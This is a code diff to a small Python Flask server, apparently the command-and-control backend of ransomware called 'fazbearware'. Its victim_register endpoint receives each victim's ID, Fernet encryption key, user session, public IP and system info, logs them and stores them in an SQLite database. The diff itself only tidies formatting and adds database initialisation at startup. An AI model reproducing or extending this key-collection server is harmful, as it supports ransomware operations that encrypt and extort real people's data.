@@ -10,6 +10,7 @@ app = Flask(__name__)
 
 #DATABASE
 DATABASE = "fazbearware.db"
+
 def init_db():
     conn = sqlite3.connect(DATABASE)
     cursor = conn.cursor()
@@ -25,7 +26,7 @@ def init_db():
     ''')
     conn.commit()
     conn.close()
-    
+    print(f"[*] Database {DATABASE} initialized.") # Esto te confirmará que se creó
 
 # REGISTER PATHS
 @app.route('/')
@@ -36,7 +37,6 @@ def home():
 def victim_register():
     data = request.get_json()
     if data:
-
         victim = data.get("victim_ID")
         user = data.get("current_user")
         ip = data.get("public_ip")
@@ -46,14 +46,13 @@ def victim_register():
         print(f"\n[!] Endpoint detected")
         print(f"[*] -----------------------------------------")
         print(f"[+] Victim ID    : {victim}")
-        print(f"[+] Fernet Key  : {key}")
+        print(f"[+] Fernet Key   : {key}")
         print(f"[+] User Session : {user}")
         print(f"[+] Public IP    : {ip}")
         print(f"[+] System Info  : {sys_info}")
         print(f"[*] -----------------------------------------")
 
         #SAVE INFO IN SQLITE3 DATABASE 
-        
         try:
             conn = sqlite3.connect(DATABASE)
             cursor = conn.cursor()
@@ -71,6 +70,7 @@ def victim_register():
     
     return {"status": "error", "message": "No data send"}, 400
 
-# EXECUTE SERVER IN LOCALHOST PORT 5000)
+# EXECUTE SERVER IN LOCALHOST PORT 5000
 if __name__ == '__main__':
+    init_db()  
     app.run(port=5000, debug=True)
